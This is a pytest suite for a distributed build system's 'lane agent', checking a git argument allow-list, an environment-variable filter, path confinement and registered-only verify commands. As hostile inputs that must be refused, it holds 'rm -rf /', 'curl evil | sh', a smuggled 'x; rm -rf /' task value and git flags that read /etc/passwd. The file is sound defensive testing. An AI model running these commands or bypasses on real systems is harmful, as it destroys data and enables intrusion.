"""The lane agent (foundry_client/lane.py + its /api/lane routes), Distributed Foundry phase b
B1: docs/plans/DISTRIBUTED_FOUNDRY_PHASE_B.md."""

from __future__ import annotations

import base64
import os
import subprocess
import sys
import time

import pytest

from foundry_client import lane as L


def git(cwd, *args):
    return subprocess.run(["git", "-C", str(cwd), *args], capture_output=True, text=True,
                          check=True).stdout.strip()


@pytest.fixture
def host(tmp_path):
    """A lane store for project `pilot` with one commit, and a LaneHost over it."""
    src = tmp_path / "src"
    src.mkdir()
    git(src, "init", "-q", "-b", "main")
    git(src, "config", "user.email", "t@example.com")
    git(src, "config", "user.name", "t")
    (src / "a.txt").write_text("one\n", encoding="utf-8")
    git(src, "add", "a.txt")
    git(src, "commit", "-q", "-m", "first")
    root = tmp_path / "lanes"
    root.mkdir()
    subprocess.run(["git", "clone", "-q", "--bare", str(src), str(root / "pilot.git")],
                   check=True)
    h = L.LaneHost(str(root), str(tmp_path / "state"), version="9.9.9")
    h.base = git(src, "rev-parse", "HEAD")
    return h


def wait(h, rid, timeout=60):
    t0 = time.time()
    while time.time() - t0 < timeout:
        st = h.run_status(rid)
        if st["state"] != "running":
            return st
        time.sleep(0.05)
    raise AssertionError("job did not end")


CHECKS = {"version": ["git", "--version"],
           "sleep": [sys.executable, "-c", "import time; time.sleep(60)"],
           "task": [sys.executable, "-c", "import sys; print('T={task} S={sha} W={workspace}')"]}


def add(h, lane="l1", checks=None):
    st = wait(h, h.start_job("pilot", lane, "worktree-add",
                             {"base": h.base, "checks": CHECKS if checks is None else checks})
              ["run_id"])
    assert st["state"] == "done", st
    return h.worktree_of("pilot", lane)


def verify(h, name, subs=None, lane="l1", command=None):
    return h.start_job("pilot", lane, "verify",
                       {"check": name, "command": CHECKS[name] if command is None else command,
                        "subs": subs or {"task": "T1", "sha": "a" * 40, "base": ""}})["run_id"]


def test_worktree_add_holds_the_lane_and_refuses_a_second_writer(host):
    wt = add(host)
    assert os.path.isfile(os.path.join(wt, "a.txt"))
    assert host.lanes()["pilot/l1"]["state"] == "held"
    assert git(wt, "rev-parse", "--abbrev-ref", "HEAD") == "track/l1"
    st = wait(host, host.start_job("pilot", "l1", "worktree-add", {"base": host.base})["run_id"])
    assert st["state"] == "failed" and "one writer per lane" in st["output"]


def test_worktree_add_needs_the_store_and_a_full_base(host, tmp_path):
    st = wait(host, host.start_job("other", "l1", "worktree-add", {"base": host.base})["run_id"])
    assert st["state"] == "failed" and "no lane store" in st["output"]
    st = wait(host, host.start_job("pilot", "l2", "worktree-add", {"base": "HEAD"})["run_id"])
    assert st["state"] == "failed" and "40 hex" in st["output"]
    assert "pilot/l2" not in host.lanes()


@pytest.mark.parametrize("argv,why", [
    (["push", "origin", "HEAD"], "not allowed"),
    (["fetch"], "not allowed"),
    (["-c", "core.pager=x", "log"], "not allowed"),
    (["log", "--output=/tmp/x"], "--output"),
    (["diff", "--ext-diff"], "--ext-diff"),
    (["add", "--pathspec-from-file=/etc/passwd"], "--pathspec-from-file"),
    (["checkout", "main"], "only restores paths"),
    ([], "non-empty"),
    # review 2026-11-27: the holes in the allow-list
    (["grep", "-O", "x"], "-O"),
    (["grep", "-Ovim", "x"], "-Ovim"),
    (["grep", "--open-files-in-pager=vim", "x"], "--open-files-in-pager"),
    (["grep", "-f", "/etc/passwd"], "-f"),
    (["diff", "--no-index", "/etc/passwd", "a.txt"], "--no-index"),
    (["grep", "--no-index", "root", "/etc"], "--no-index"),
    (["update-ref", "refs/heads/master", "HEAD"], "only its own branch"),
    (["update-ref", "-d", "refs/heads/track/l1"], "-d"),
    (["update-ref", "--stdin"], "--stdin"),
    (["checkout", "main", "--"], "only restores paths"),
    (["checkout", "-b", "x", "--", "a.txt"], "only restores paths"),
    (["checkout", "--detach", "HEAD", "--", "a.txt"], "only restores paths"),
    (["checkout", "a", "b", "--", "a.txt"], "only restores paths"),
    (["reset", "--hard"], "only unstages"),
    (["reset", "--soft", "HEAD~1"], "only unstages"),
    (["reset", "-q", "HEAD~1", "--", "a.txt"], "only unstages"),
    (["commit", "--amend", "-m", "x"], "--amend"),
    (["commit", "--no-verify", "-m", "x"], "--no-verify"),
    (["commit", "-n", "-m", "x"], "-n"),
    (["commit", "-F", "/etc/passwd"], "-F"),
    (["commit", "-F/etc/passwd"], "-F/etc/passwd"),
    (["commit", "--file=/etc/passwd"], "--file"),
    (["commit-tree", "HEAD^{tree}", "-F", "/etc/passwd"], "-F"),
    (["hash-object", "-w", "--", "a.txt"], "-w"),
    (["hash-object", "--", "/etc/passwd"], "only reads files inside"),
    (["hash-object", "--", "../../x"], "only reads files inside"),
    (["symbolic-ref", "HEAD", "refs/heads/master"], "only reads"),
    (["read-tree", "--index-output=/tmp/x", "HEAD"], "--index-output"),
    (["cat-file", "--textconv", "HEAD:a.txt"], "--textconv"),
    (["log", "--exec-path=/tmp"], "--exec-path"),
])
def test_git_allow_list(host, argv, why):
    add(host)
    with pytest.raises(L.LaneError, match=__import__("re").escape(why)):
        host.git("pilot", "l1", argv)


@pytest.mark.parametrize("argv", [
    ["checkout", "--", "a.txt"],                              # scope.py restores a path
    ["checkout", "HEAD", "--", "a.txt"],
    ["reset", "-q", "--pathspec-from-file=-"],                # commit_paths unstages
    ["reset", "-q", "--", "a.txt"],
    ["symbolic-ref", "-q", "HEAD"],
    ["grep", "-F", "-n", "one", "--", "a.txt"],
    ["commit", "-q", "-m", "--amend is only words here", "--pathspec-from-file=-"],
    ["hash-object", "--", "a.txt"],
    ["log", "-1", "--format=%H", "--", "--output=not-an-option-after-the-dashes"],
])
def test_what_the_coordinator_sends_still_passes(host, argv):
    add(host)
    assert L.check_git_argv(argv, branch="track/l1") == argv


def test_update_ref_moves_only_the_lanes_own_branch(host):
    """commits.py rewords a lane's commits with update-ref on its branch (symbolic-ref HEAD)."""
    wt = add(host)
    head = git(wt, "rev-parse", "HEAD")
    out = host.git("pilot", "l1", ["update-ref", "-m", "reword", "refs/heads/track/l1", head,
                                   head])
    assert out["rc"] == 0, out
    with pytest.raises(L.LaneError, match="only its own branch"):
        host.git("pilot", "l1", ["update-ref", "refs/heads/slot/_base/l1", head])


def test_git_runs_in_the_worktree_and_reads_stdin(host):
    wt = add(host)
    out = host.git("pilot", "l1", ["rev-parse", "HEAD"])
    assert out["rc"] == 0 and out["stdout"].strip() == host.base
    with open(os.path.join(wt, "b.txt"), "w", encoding="utf-8") as f:
        f.write("two\n")
    r = host.git("pilot", "l1", ["add", "-A", "--pathspec-from-file=-"], input="b.txt\n")
    assert r["rc"] == 0
    assert "b.txt" in host.git("pilot", "l1", ["diff", "--cached", "--name-only"])["stdout"]


def test_git_env_keeps_only_commit_variables(host):
    assert L.env_allowed("GIT_AUTHOR_NAME") and L.env_allowed("AU_ALLOW_SCOPE")
    for bad in ("PATH", "GIT_DIR", "GIT_SSH_COMMAND", "GIT_CONFIG_PARAMETERS", "LD_PRELOAD",
                "FOUNDRY_KEY", "OPENCODE_SERVER_PASSWORD", "MY_TOKEN", "lower", "GIT_INDEX_FILE"):
        assert not L.env_allowed(bad), bad


def test_an_unknown_lane_is_404(host):
    with pytest.raises(L.LaneError) as e:
        host.git("pilot", "nope", ["status"])
    assert e.value.status == 404
    with pytest.raises(L.LaneError, match="bad lane name"):
        host.git("pilot", "../x", ["status"])


@pytest.mark.parametrize("path", ["../outside.txt", "/etc/passwd", "C:/x", ".git/config",
                                  "a/../../x", ""])
def test_paths_stay_inside_the_lane(host, path):
    add(host)
    with pytest.raises(L.LaneError):
        host.read("pilot", "l1", path)


def test_read_write_stat(host):
    wt = add(host)
    host.write("pilot", "l1", "docs/new.md", base64.b64encode(b"hello\r\n").decode())
    with open(os.path.join(wt, "docs", "new.md"), "rb") as f:
        assert f.read() == b"hello\r\n"
    r = host.read("pilot", "l1", "docs/new.md")
    assert r["exists"] and base64.b64decode(r["data"]) == b"hello\r\n" and not r["truncated"]
    r = host.read("pilot", "l1", "docs/new.md", max_bytes=2)
    assert base64.b64decode(r["data"]) == b"he" and r["truncated"]
    assert host.read("pilot", "l1", "missing.txt") == {"exists": False}
    st = host.stat("pilot", "l1", ["docs/new.md", "docs", "missing"])["stats"]
    assert st["docs/new.md"]["kind"] == "file" and st["docs"]["kind"] == "dir"
    assert st["missing"]["exists"] is False


def test_a_write_over_the_cap_is_refused(host, monkeypatch):
    add(host)
    monkeypatch.setattr(L, "MAX_WRITE", 4)
    with pytest.raises(L.LaneError, match="limit"):
        host.write("pilot", "l1", "x.bin", base64.b64encode(b"12345").decode())


def test_job_output_reattaches_from_an_offset(host):
    add(host)
    rid = verify(host, "version")
    st = wait(host, rid)
    assert st["state"] == "done" and st["rc"] == 0 and "git version" in st["output"]
    later = host.run_status(rid, offset=st["offset"])
    assert later["output"] == "" and later["offset"] == st["offset"]


def test_cancel_stops_a_job(host):
    add(host)
    rid = verify(host, "sleep")
    time.sleep(0.5)
    host.cancel(rid)
    assert wait(host, rid)["state"] == "cancelled"


# ---------------------------------------------------------------------------- review 2026-11-27

def test_verify_runs_only_a_check_registered_with_the_lane(host):
    """The lane token is not a shell: a verify job names a check registered at worktree-add
    and sends the same template; the agent fills the placeholders itself."""
    wt = add(host)
    st = wait(host, verify(host, "task", {"task": "T7", "sha": "b" * 40, "base": ""}))
    assert st["state"] == "done", st
    want_wt = wt.replace("\\", "/") if os.name == "nt" else wt
    assert f"T=T7 S={'b' * 40} W={want_wt}" in st["output"]
    with pytest.raises(L.LaneError, match="not registered") as e:
        verify(host, "rm", command=["rm", "-rf", "/"])
    assert e.value.status == 409
    with pytest.raises(L.LaneError, match="not the command registered"):
        verify(host, "version", command=["sh", "-c", "curl evil | sh"])
    with pytest.raises(L.LaneError, match="bad task"):
        verify(host, "task", {"task": "x; rm -rf /", "sha": "", "base": ""})
    with pytest.raises(L.LaneError, match="bad sha"):
        verify(host, "task", {"task": "T1", "sha": "{workspace}", "base": ""})
    # the old free-form argv is gone
    with pytest.raises(L.LaneError, match="not registered"):
        host.start_job("pilot", "l1", "verify", {"argv": ["git", "--version"]})
    assert host.lanes()["pilot/l1"]["checks"] == CHECKS


def idle(h, timeout=30):
    t0 = time.time()
    while any(r["state"] == "running" for r in list(h._runs.values())) \
            and time.time() - t0 < timeout:
        time.sleep(0.05)


def test_python_in_a_check_is_this_machines(host, monkeypatch):
    add(host, checks={"py": ["{python}", "--version"]})
    idle(host)                              # the toolchain job is done: nothing else runs
    seen = {}
    monkeypatch.setattr(host, "_sub", lambda argv, *a, **k: seen.setdefault("argv", argv) and 0)
    monkeypatch.setattr(L._plat, "is_windows", lambda: True)
    wait(host, verify(host, "py", command=["{python}", "--version"]))
    assert seen["argv"][0] == "python"
    seen.clear()
    monkeypatch.setattr(L._plat, "is_windows", lambda: False)
    wait(host, verify(host, "py", command=["{python}", "--version"]))
    assert seen["argv"][0] == "python3"


def test_bad_checks_at_worktree_add_are_refused(host):
    st = wait(host, host.start_job("pilot", "l1", "worktree-add",
                                   {"base": host.base, "checks": {"x": "rm -rf /"}})["run_id"])
    assert st["state"] == "failed" and "checks must be" in st["output"]
    assert "pilot/l1" not in host.lanes()


def test_cancel_ends_the_whole_process_tree(host, tmp_path):
    """A check's child processes go with it (foundry_platform.kill_tree)."""
    marker = tmp_path / "child.pid"
    script = ("import subprocess, sys, time; "
              "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)']); "
              f"open(r'{marker}', 'w').write(str(p.pid)); time.sleep(120)")
    add(host, checks={"tree": [sys.executable, "-c", script]})
    rid = verify(host, "tree", command=[sys.executable, "-c", script])
    t0 = time.time()
    while not (marker.exists() and marker.read_text().strip()) and time.time() - t0 < 30:
        time.sleep(0.1)
    child = int(marker.read_text())
    host.cancel(rid)
    assert wait(host, rid)["state"] == "cancelled"
    t0 = time.time()
    while _alive(child) and time.time() - t0 < 15:
        time.sleep(0.2)
    assert not _alive(child), "the check's child process outlived the cancel"


def _alive(pid: int) -> bool:
    if os.name == "nt":
        r = subprocess.run(["tasklist", "/FI", f"PID eq {pid}", "/NH"], capture_output=True,
                           text=True)
        return str(pid) in r.stdout
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    try:                                   # a zombie (reaped by nobody yet) counts as gone
        with open(f"/proc/{pid}/stat", encoding="utf-8") as f:
            return f.read().split()[2] != "Z"
    except OSError:
        return True


def test_toolchain_is_its_own_job_and_lune_waits_for_it(host, monkeypatch):
    """worktree-add returns before the toolchain install ends (review 2026-11-27: rokit and
    wally inside the create wait held a lane for more than JOB_WAIT_S)."""
    gate = __import__("threading").Event()
    monkeypatch.setattr(host, "_toolchain", lambda p, l, say, run, log: (gate.wait(30), 0)[1])
    t0 = time.time()
    wt = add(host)
    assert time.time() - t0 < 20 and os.path.isdir(wt)
    tc = [r for r in host._runs.values() if r["job"] == "toolchain"]
    assert len(tc) == 1 and tc[0]["state"] == "running"
    monkeypatch.setattr(L.shutil, "which", lambda name, path=None: None)
    rid = host.start_job("pilot", "l1", "lune", {"args": []})["run_id"]
    time.sleep(0.5)
    assert host.run_status(rid)["state"] == "running"
    assert "waiting for the toolchain install" in host.run_status(rid)["output"]
    gate.set()
    st = wait(host, rid)
    assert st["rc"] == 127 and "not found: lune" in st["output"]


def test_a_failed_add_leaves_nothing_and_can_be_made_again(host, monkeypatch):
    real = host._sub

    def failing(argv, run, log, **kw):
        if "worktree" in argv and "add" in argv:
            # git made the folder and the branch, then died (a timeout, a cancel)
            real(argv, run, log, **kw)
            return 124
        return real(argv, run, log, **kw)
    monkeypatch.setattr(host, "_sub", failing)
    st = wait(host, host.start_job("pilot", "l1", "worktree-add", {"base": host.base})["run_id"])
    assert st["state"] == "failed" and "pilot/l1" not in host.lanes()
    store = os.path.join(host.root, "pilot.git")
    assert not os.path.exists(os.path.join(host.root, "pilot", "l1"))
    assert subprocess.run(["git", "-C", store, "rev-parse", "--verify", "-q",
                           "refs/heads/track/l1"], capture_output=True).returncode != 0
    monkeypatch.setattr(host, "_sub", real)
    assert os.path.isdir(add(host))


def test_an_add_that_never_finished_is_cleaned_up_by_the_next_one(host):
    """The agent restarted mid-add: its registry says "adding" and no run holds it."""
    have = host.lanes()
    wt = os.path.join(host.root, "pilot", "l1")
    have["pilot/l1"] = {"project": "pilot", "lane": "l1", "state": "adding", "worktree": wt,
                        "branch": "track/l1", "base": host.base, "added": 0}
    host._save(have)
    os.makedirs(wt)
    assert os.path.isdir(add(host))
    assert host.lanes()["pilot/l1"]["state"] == "held"


def test_read_comes_in_pieces_with_its_size(host, monkeypatch):
    add(host)
    host.write("pilot", "l1", "big.bin", base64.b64encode(b"0123456789").decode())
    monkeypatch.setattr(L, "MAX_READ", 4)
    r = host.read("pilot", "l1", "big.bin")
    assert r["truncated"] and r["size"] == 10 and base64.b64decode(r["data"]) == b"0123"
    r = host.read("pilot", "l1", "big.bin", offset=8)
    assert not r["truncated"] and r["offset"] == 8 and base64.b64decode(r["data"]) == b"89"


def test_worktree_remove_reads_status_names_exactly(host):
    """-z: a quoted (non-ASCII) name in `git status` matched no saved path before."""
    wt = add(host)
    head = git(wt, "rev-parse", "HEAD")
    name = "café menu.txt"
    with open(os.path.join(wt, name), "w", encoding="utf-8") as f:
        f.write("x")
    st = wait(host, host.start_job("pilot", "l1", "worktree-remove",
                                   {"tip": head, "saved": ["other.txt"]})["run_id"])
    assert st["state"] == "failed" and "not saved" in st["output"]
    st = wait(host, host.start_job("pilot", "l1", "worktree-remove",
                                   {"tip": head, "saved": [name]})["run_id"])
    assert st["state"] == "done", st
    assert not os.path.exists(wt)


def test_parse_status_z():
    out = "R  new name.txt\0old name.txt\0 M a.txt\0?? café.txt\0 D gone.txt\0"
    assert L.parse_status_z(out) == [("R ", "new name.txt", "old name.txt"),
                                     (" M", "a.txt", ""), ("??", "café.txt", ""),
                                     (" D", "gone.txt", "")]


def test_a_discarded_lane_goes_with_its_branch(host):
    wt = add(host)
    st = wait(host, host.start_job("pilot", "l1", "worktree-remove",
                                   {"tip": host.base, "saved": [],
                                    "drop_branch_at": host.base})["run_id"])
    assert st["state"] == "done", st
    store = os.path.join(host.root, "pilot.git")
    assert subprocess.run(["git", "-C", store, "rev-parse", "--verify", "-q",
                           "refs/heads/track/l1"], capture_output=True).returncode != 0
    assert not os.path.isdir(wt)
    assert os.path.isdir(add(host))                         # the same name is made again


def test_an_unknown_job_is_refused(host):
    with pytest.raises(L.LaneError, match="no job"):
        host.start_job("pilot", "l1", "rm-rf", {})


def test_remove_needs_the_fetched_tip_and_a_clean_tree(host):
    wt = add(host)
    head = git(wt, "rev-parse", "HEAD")
    st = wait(host, host.start_job("pilot", "l1", "worktree-remove", {"tip": "0" * 40})["run_id"])
    assert st["state"] == "failed" and "fetch it first" in st["output"]
    with open(os.path.join(wt, "dirty.txt"), "w", encoding="utf-8") as f:
        f.write("x")
    st = wait(host, host.start_job("pilot", "l1", "worktree-remove", {"tip": head})["run_id"])
    assert st["state"] == "failed" and "uncommitted" in st["output"]
    os.remove(os.path.join(wt, "dirty.txt"))
    st = wait(host, host.start_job("pilot", "l1", "worktree-remove", {"tip": head})["run_id"])
    assert st["state"] == "done" and "pilot/l1" not in host.lanes()
    assert not os.path.exists(wt)


def test_health_names_lanes_heads_and_disk(host):
    add(host)
    h = host.health({"kilo": {"state": "running"}})
    assert h["ok"] and h["version"] == "9.9.9" and h["lanes"]["pilot/l1"]["head"] == host.base
    assert h["disk"]["total_gb"] > 0 and h["components"]["kilo"]["state"] == "running"


def test_secrets_file_is_fresh_and_private(tmp_path):
    p = str(tmp_path / "s" / "lane.json")
    a = L.ensure_secrets(p, {"kilo_password": "k", "opencode_password": ""})
    b = L.ensure_secrets(p, {"kilo_password": "k"})
    assert a["token"] != b["token"] and b["kilo_password"] == "k" and "opencode_password" not in b
    import json
    assert json.load(open(p, encoding="utf-8"))["token"] == b["token"]
    if os.name != "nt":
        assert (os.stat(p).st_mode & 0o777) == 0o600


# ---------------------------------------------------------------------------- the routes

def _app(host, lane_token="LT", bind="127.0.0.1", peer=None):
    from fastapi.testclient import TestClient
    from foundry_client import api

    class Mgr:
        cfg = {"client": {"backend_url": "http://x"}}

        def status(self):
            return {"components": [{"name": "kilo", "state": "running", "healthy": True}]}
    app = api.create_app(Mgr(), "CT", lane=host, lane_token=lane_token, bind=bind)
    if peer:                                 # the caller's address as uvicorn would give it
        inner = app

        async def app(scope, receive, send):
            if scope.get("type") == "http":
                scope = {**scope, "client": (peer, 50000)}
            await inner(scope, receive, send)
    return TestClient(app, base_url="http://127.0.0.1:47811")


def test_bound_to_every_address_only_lane_routes_answer_others(host):
    """review 2026-11-27: in a slot's container the client binds 0.0.0.0 (docker publishes the
    lane port on the host's 127.0.0.1); its settings page and client routes must not answer
    a caller from outside the container's own loopback."""
    add(host)
    out = _app(host, bind="0.0.0.0", peer="172.17.0.1")      # docker's bridge (the tunnel)
    assert out.get("/api/lane/health", headers={"x-lane-token": "LT"}).status_code == 200
    r = out.get("/api/status", headers={"x-client-token": "CT"})
    assert r.status_code == 403 and "lane calls only" in r.json()["error"]
    assert out.get("/").status_code == 403
    assert out.get("/api/settings", headers={"x-lane-token": "LT"}).status_code == 403
    # from inside the container itself, and on the workstation (loopback bind): as before
    inside = _app(host, bind="0.0.0.0", peer="127.0.0.1")
    assert inside.get("/api/status", headers={"x-client-token": "CT"}).status_code != 403
    ws = _app(host, peer="10.9.9.9")                         # bound to 127.0.0.1
    assert ws.get("/api/status", headers={"x-client-token": "CT"}).status_code != 403


def test_is_loopback():
    from foundry_client.api import is_loopback
    assert is_loopback("127.0.0.1") and is_loopback("::1") and is_loopback("::ffff:127.0.0.5")
    assert not is_loopback("0.0.0.0") and not is_loopback("172.17.0.1") and not is_loopback("")


def test_routes_need_the_lane_token_and_only_open_lane_routes(host):
    add(host)
    c = _app(host)
    assert c.get("/api/lane/health").status_code == 401
    assert c.get("/api/lane/health", headers={"x-client-token": "CT"}).status_code == 401
    r = c.get("/api/lane/health", headers={"x-lane-token": "LT"})
    assert r.status_code == 200 and r.json()["lanes"]["pilot/l1"]["head"] == host.base
    assert r.json()["components"]["kilo"]["state"] == "running"
    # the lane token opens nothing else
    assert c.get("/api/settings", headers={"x-lane-token": "LT"}).status_code == 401


def test_routes_answer_git_and_errors(host):
    add(host)
    c = _app(host)
    h = {"x-lane-token": "LT"}
    r = c.post("/api/lane/git", headers=h,
               json={"project": "pilot", "lane": "l1", "argv": ["rev-parse", "HEAD"]})
    assert r.json()["stdout"].strip() == host.base
    r = c.post("/api/lane/git", headers=h,
               json={"project": "pilot", "lane": "l1", "argv": ["push"]})
    assert r.status_code == 400 and "not allowed" in r.json()["error"]
    r = c.post("/api/lane/read", headers=h, json={"project": "pilot", "lane": "zz", "path": "a"})
    assert r.status_code == 404


def test_lane_routes_are_off_without_a_lane_host():
    from fastapi.testclient import TestClient
    from foundry_client import api

    class Mgr:
        cfg = {"client": {}}
    c = TestClient(api.create_app(Mgr(), "CT"), base_url="http://127.0.0.1:47811")
    r = c.get("/api/lane/health", headers={"x-lane-token": "anything"})
    assert r.status_code == 404 and "holds no lanes" in r.json()["error"]


def test_config_lane_defaults_off_and_validates():
    from foundry_client import config
    cfg = config._merge(config.DEFAULTS, {})
    assert cfg["lane"] == {"enabled": False, "root": "", "secrets_file": "",
                           "listen": "127.0.0.1"}
    assert not [e for e in config.validate(cfg) if "lane" in e or "hostname" in e]
    bad = config._merge(config.DEFAULTS, {"lane": {"enabled": True, "listen": "8.8.8.8"}})
    errs = config.validate(bad)
    assert any("lane.listen" in e for e in errs) and any("lane.root" in e for e in errs)
    bad = config._merge(config.DEFAULTS, {"components": {"kilo": {"hostname": "1.2.3.4"}}})
    assert any("components.kilo.hostname" in e for e in config.validate(bad))


class Direct:
    """The coordinator's wait_job against a LaneHost, without HTTP."""
    name = "slot-t"

    def __init__(self, h):
        self.h = h

    def call(self, route, body, timeout=60):
        if route == "run":
            return self.h.start_job(body["project"], body["lane"], body["job"], body["args"])
        if route == "run_status":
            return self.h.run_status(body["id"], body.get("offset", 0))
        return {"ok": True}


def test_a_job_that_ends_during_a_status_read_never_loses_its_last_lines(host, monkeypatch):
    """v0.181.270 Linux CI (test_the_agent_says_when_lune_is_missing): run_status read the log
    and then the state; a job that ended in between came back "done" without its last lines,
    and wait_job stopped there. The read is held here until the job has ended."""
    from foundry_coordinator.lane_fetch import wait_job
    # the markers are built at run time: the job's own "LANE verify <command>" line must not
    # contain them
    script = ("import time; print('FIR' + 'ST', flush=True); time.sleep(1); "
              "print('LAST' + ' LINE')")
    add(host, checks={"two": [sys.executable, "-c", script]})
    idle(host)
    real = L.LaneHost._read_log
    held = []

    def slow_read(path, start, size=1024 * 1024):
        out = real(path, start, size)
        run = next(r for r in host._runs.values() if r["log"] == path)
        if not held and b"FIRST" in out[0] and run["state"] == "running":
            held.append(1)
            t0 = time.time()
            while run["state"] == "running" and time.time() - t0 < 30:
                time.sleep(0.02)                    # the job ends while this read is out
        return out
    monkeypatch.setattr(host, "_read_log", slow_read)
    job = wait_job(Direct(host), "pilot", "l1", "verify",
                   {"check": "two", "command": [sys.executable, "-c", script],
                    "subs": {"task": "T1", "sha": "", "base": ""}}, sleep=lambda s: None)
    assert held, "the read never overlapped the job's end"
    assert job["state"] == "done" and "FIRST" in job["output"] and "LAST LINE" in job["output"]


def test_an_ended_job_with_more_output_than_one_reply_says_running_until_read(host,
                                                                            monkeypatch):
    from foundry_coordinator.lane_fetch import wait_job
    script = "print('x' * 95); print('THE END')"
    add(host, checks={"long": [sys.executable, "-c", script]})
    idle(host)
    real = L.LaneHost._read_log
    monkeypatch.setattr(host, "_read_log", lambda path, start: real(path, start, 10))
    rid = verify(host, "long", command=[sys.executable, "-c", script])
    while host._runs[rid]["state"] == "running":
        time.sleep(0.05)
    first = host.run_status(rid)
    assert first["state"] == "running" and first["rc"] is None and first["offset"] == 10
    job = wait_job(Direct(host), "pilot", "l1", "verify",
                   {"check": "long", "command": [sys.executable, "-c", script],
                    "subs": {"task": "T1", "sha": "", "base": ""}}, sleep=lambda s: None)
    assert job["state"] == "done" and job["rc"] == 0 and "THE END" in job["output"]


def test_the_client_passes_its_bind_address_to_the_app():
    import inspect
    from foundry_client import __main__ as M
    src = inspect.getsource(M.cmd_run)
    assert "bind=bind" in src and src.index("bind = (") < src.index("api.create_app(")
